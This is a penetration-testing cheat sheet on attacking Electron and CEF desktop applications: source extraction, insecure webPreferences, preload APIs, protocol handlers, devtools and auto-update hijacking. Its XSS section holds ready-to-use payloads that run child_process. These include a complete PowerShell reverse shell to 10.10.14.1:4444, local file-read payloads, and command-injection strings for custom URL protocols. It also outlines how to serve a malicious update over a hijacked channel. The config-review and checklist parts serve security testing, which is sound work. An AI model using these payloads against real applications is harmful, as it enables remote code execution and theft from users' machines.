# Electron / CEF Application Attacks

> Many modern "desktop apps" are Electron/CEF wrappers (VS Code, Slack, Teams, Discord, etc.)
> Severity: CRITICAL — RCE via XSS when nodeIntegration is enabled

## Identify Electron/CEF App
```powershell
# Check for Electron markers
Test-Path "C:\path\to\app\resources\electron.asar"
Test-Path "C:\path\to\app\resources\app.asar"
Get-ChildItem "C:\path\to\app" -Filter "libcef.dll"   # CEF
Get-ChildItem "C:\path\to\app" -Filter "electron.exe"

# Check process
Get-Process | Where-Object { $_.Modules.ModuleName -contains "electron.exe" -or $_.Modules.ModuleName -contains "libcef.dll" }
```

## 1. Extract Source Code
```bash
# Install asar tool
npm install -g @electron/asar

# Extract application source
npx asar extract resources/app.asar ./extracted
# or for older apps:
npx asar extract resources/app.asar.unpacked ./extracted

# Some apps don't use asar — source is directly in resources/app/
```

## 2. Check Security Configuration (CRITICAL)

### In extracted main.js / main process:
```javascript
// DANGEROUS — look for these:
new BrowserWindow({
    webPreferences: {
        nodeIntegration: true,          // CRITICAL: gives renderer full Node.js access
        contextIsolation: false,        // CRITICAL: no isolation between web/node
        sandbox: false,                 // HIGH: no sandbox
        webSecurity: false,             // CRITICAL: disables same-origin policy
        allowRunningInsecureContent: true,  // HIGH: mixed content
        enableRemoteModule: true,       // HIGH: deprecated, allows remote require
    }
});

// SAFE configuration (what it should be):
new BrowserWindow({
    webPreferences: {
        nodeIntegration: false,
        contextIsolation: true,
        sandbox: true,
        webSecurity: true,
        preload: path.join(__dirname, 'preload.js')  // limited API via preload
    }
});
```

## 3. XSS → RCE (when nodeIntegration: true)

### If the app has any XSS (reflected, stored, DOM-based):
```javascript
// XSS payload that pops calc via Node.js
<img src=x onerror="require('child_process').exec('calc.exe')">

// Reverse shell via XSS
<img src=x onerror="require('child_process').exec('powershell -nop -c $c=New-Object System.Net.Sockets.TCPClient(\"10.10.14.1\",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()')">

// Read local files
<img src=x onerror="document.write(require('fs').readFileSync('C:\\Windows\\win.ini','utf8'))">

// List directory
<img src=x onerror="document.write(JSON.stringify(require('fs').readdirSync('C:\\\\')))">
```

### If contextIsolation is false (even without nodeIntegration):
```javascript
// Prototype pollution → RCE via preload script
// Pollute Object.prototype to intercept preload's require()
```

## 4. Preload Script Analysis
```javascript
// Check preload.js — it bridges web content and Node.js
// Look for overly permissive APIs exposed via contextBridge:

contextBridge.exposeInMainWorld('api', {
    exec: (cmd) => require('child_process').exec(cmd),  // CRITICAL
    readFile: (path) => fs.readFileSync(path, 'utf8'),   // HIGH
    writeFile: (path, data) => fs.writeFileSync(path, data), // CRITICAL
});

// These can be called from the renderer:
window.api.exec('calc.exe');
window.api.readFile('C:\\Windows\\win.ini');
```

## 5. Protocol Handler Attacks
```
# Electron apps often register custom protocol handlers (e.g., myapp://)
# Check registry:
reg query HKCU\Software\Classes /s /f "URL Protocol" 2>nul | findstr /i "app"

# Test for command injection in protocol handler:
# Open in browser: myapp://'; calc.exe; echo '
# Or: myapp://$(calc.exe)
# Or: myapp://%26calc.exe%26

# Check if protocol handler validates input:
start myapp://test
start myapp://../../etc/passwd
start "myapp://'; require('child_process').exec('calc.exe'); //'"
```

## 6. Deep Link / URL Handler Injection
```powershell
# Find registered URL protocols
Get-ChildItem "HKCU:\Software\Classes" | Where-Object {
    (Get-ItemProperty "$($_.PSPath)\shell\open\command" -ErrorAction SilentlyContinue) -and
    (Get-ItemProperty $_.PSPath -Name "URL Protocol" -ErrorAction SilentlyContinue)
} | ForEach-Object {
    $name = $_.PSChildName
    $cmd = (Get-ItemProperty "$($_.PSPath)\shell\open\command" -ErrorAction SilentlyContinue).'(default)'
    Write-Host "$name -> $cmd"
}
```

## 7. Devtools Access
```
# If app doesn't disable devtools:
# Ctrl+Shift+I or F12 to open devtools
# From devtools console with nodeIntegration:
require('child_process').exec('calc.exe')

# Programmatically (from extracted source):
# Check if: mainWindow.webContents.openDevTools() is accessible
# Check if: --inspect or --remote-debugging-port flags work
electron.exe --inspect=9229 app
# Then connect Chrome DevTools to ws://127.0.0.1:9229
```

## 8. Auto-Update Hijacking
```
# Electron apps using electron-updater / Squirrel:
# 1. Find update URL in source code
grep -r "update\|autoUpdater\|feedURL\|setFeedURL" ./extracted/

# 2. MitM the update channel (if HTTP or weak cert validation)
# 3. Serve malicious update package
# 4. App downloads and executes attacker's code as current user (or SYSTEM if service)

# Squirrel update format:
# RELEASES file → points to .nupkg → extracted and executed
```

## 9. Test Checklist

- [ ] Extract and review source (asar extract)
- [ ] Check nodeIntegration / contextIsolation / sandbox settings
- [ ] Check preload script for overly permissive APIs
- [ ] Test XSS in any input field → does it execute Node.js?
- [ ] Check protocol handlers for injection
- [ ] Test if devtools can be opened
- [ ] Check remote debugging port
- [ ] Review auto-update mechanism
- [ ] Check webSecurity setting (same-origin policy)
- [ ] Test for local file read via file:// protocol
- [ ] Check if app loads remote content (potential MitM)
- [ ] Review IPC handlers (ipcMain.handle / ipcRenderer.invoke)
